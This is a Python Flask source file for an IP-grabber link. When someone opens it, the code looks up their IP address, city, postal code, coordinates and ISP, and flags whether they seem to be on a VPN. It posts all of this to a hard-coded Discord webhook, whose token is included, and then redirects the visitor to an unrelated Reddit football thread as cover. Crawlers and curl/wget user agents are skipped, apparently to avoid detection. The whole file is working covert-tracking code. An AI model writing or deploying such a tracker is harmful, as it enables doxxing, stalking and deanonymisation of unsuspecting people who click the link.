import requests
from flask import Flask, request, redirect
from datetime import datetime
import threading
import time

app = Flask(__name__)

# ===================== CONFIG =====================
DISCORD_WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1430264733193207848/5fOooaQ3VYQePvd7m0ZR6hZsYPW0ML6pk9jZ5wMcin7JkyuHHVg_IQicnDqr18NWvsQh"
REDDIT_URL = "https://www.reddit.com/r/football/comments/y8xqif/how_to_be_better_in_football_in_a_fast_time/"

# Cloud / VPN detection keywords
CLOUD_PROVIDERS = ["Amazon", "AWS", "Google Cloud", "DigitalOcean", "Hetzner", "Microsoft", "Azure", "Linode", "OVH"]

# Common bot keywords
BOT_KEYWORDS = ["bot", "crawl", "spider", "wget", "curl", "python-requests"]

# Store unique IPs per day
logged_ips_today = set()
# ==================================================

def get_real_ip():
    """Extract the visitor's real IP from headers or fallback to remote_addr."""
    for header in ["X-Forwarded-For", "CF-Connecting-IP", "X-Real-IP"]:
        ip = request.headers.get(header)
        if ip:
            return ip.split(",")[0].strip()
    return request.remote_addr

def is_bot(user_agent: str) -> bool:
    ua = (user_agent or "").lower()
    return any(k in ua for k in BOT_KEYWORDS)

def get_visitor_info(ip, user_agent):
    """Query ipapi and fallback to ipwhois for visitor IP info."""
    details = {}
    try:
        # Primary: ipapi
        r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=6)
        if r.status_code == 200:
            details = r.json()
        # Fallback: ipwhois if city not found
        if not details.get("city"):
            r2 = requests.get(f"https://ipwhois.app/json/{ip}", timeout=6)
            details = r2.json()
        print(f"[DEBUG] IP info for {ip}: {details}")
    except Exception as e:
        print(f"[ERROR] IP lookup failed: {e}")

    lat = details.get("latitude") or details.get("lat") or 0
    lon = details.get("longitude") or details.get("lon") or 0
    org = details.get("org") or details.get("asn_org") or "Unknown ISP"
    vpn_detected = any(cloud.lower() in org.lower() for cloud in CLOUD_PROVIDERS)

    return {
        "ip": ip,
        "user_agent": user_agent,
        "country": details.get("country_name") or "Unknown",
        "region": details.get("region") or "Unknown",
        "city": details.get("city") or "Unknown",
        "zip": details.get("postal") or "Unknown",
        "lat": lat,
        "lon": lon,
        "org": org,
        "vpn": vpn_detected,
        "date": datetime.utcnow().strftime("%d/%m/%Y"),
        "time": datetime.utcnow().strftime("%H:%M:%S"),
    }

def send_to_discord(info, retries=3, delay=2):
    """Send visitor info to Discord webhook with retry and debug."""
    vpn_text = "Yes 🚨" if info['vpn'] else "No ✅"
    embed_color = 16711680 if info['vpn'] else 7506394  # red for VPN, teal otherwise

    payload = {
        "username": "🌍 Visitor Tracker",
        "embeds": [{
            "title": f"🚶 New Visitor from {info['country']}" + (" (VPN/Cloud)" if info['vpn'] else ""),
            "color": embed_color,
            "fields": [
                {"name": "🖥️ IP Address", "value": f"`{info['ip']}`", "inline": False},
                {"name": "📍 Location", "value": f"{info['city']}, {info['region']} ({info['country']})\nPostal: {info['zip']}", "inline": False},
                {"name": "🏢 ISP / Organization", "value": info['org'], "inline": False},
                {"name": "📱 Device Info", "value": f"`{info['user_agent']}`", "inline": False},
                {"name": "🌍 Google Maps", "value": f"[Open Map](https://www.google.com/maps?q={info['lat']},{info['lon']})", "inline": False},
                {"name": "🛡️ VPN / Proxy Detected", "value": vpn_text, "inline": False},
            ],
            "footer": {"text": f"Logged at {info['date']} {info['time']} GMT"}
        }]
    }

    for attempt in range(1, retries + 1):
        try:
            resp = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=6)
            print(f"[INFO] Discord webhook attempt {attempt}: status {resp.status_code}, response: {resp.text}")
            if 200 <= resp.status_code < 300:
                break
        except Exception as e:
            print(f"[ERROR] Discord webhook attempt {attempt} failed: {e}")
        if attempt < retries:
            time.sleep(delay)

@app.route('/')
def index():
    ip = get_real_ip()
    user_agent = request.headers.get("User-Agent", "Unknown")

    # Skip bots
    if is_bot(user_agent):
        return redirect(REDDIT_URL)

    # Skip already logged IP today
    if ip in logged_ips_today:
        return redirect(REDDIT_URL)

    # Get visitor info and send webhook
    info = get_visitor_info(ip, user_agent)
    logged_ips_today.add(ip)
    send_to_discord(info)

    return redirect(REDDIT_URL)

# Reset logged IPs every 24 hours
def clear_logged_ips():
    global logged_ips_today
    logged_ips_today = set()
    threading.Timer(86400, clear_logged_ips).start()

clear_logged_ips()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000, debug=False)
